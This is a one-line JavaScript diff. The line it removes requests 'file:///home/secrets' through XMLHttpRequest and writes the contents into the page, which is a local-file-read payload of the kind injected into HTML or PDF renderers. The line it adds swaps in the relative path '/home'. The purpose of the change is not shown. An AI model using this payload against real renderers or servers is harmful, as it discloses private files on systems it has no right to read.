@@ -1,1 +1,1 @@
-var x=new XMLHttpRequest();x.onreadystatechange=function(){if(this.readyState==4&&this.status==200){document.write(this.responseText);}};x.open("GET","file:///home/secrets", true);x.send();
+var x=new XMLHttpRequest();x.onreadystatechange=function(){if(this.readyState==4&&this.status==200){document.write(this.responseText);}};x.open("GET","/home", true);x.send();
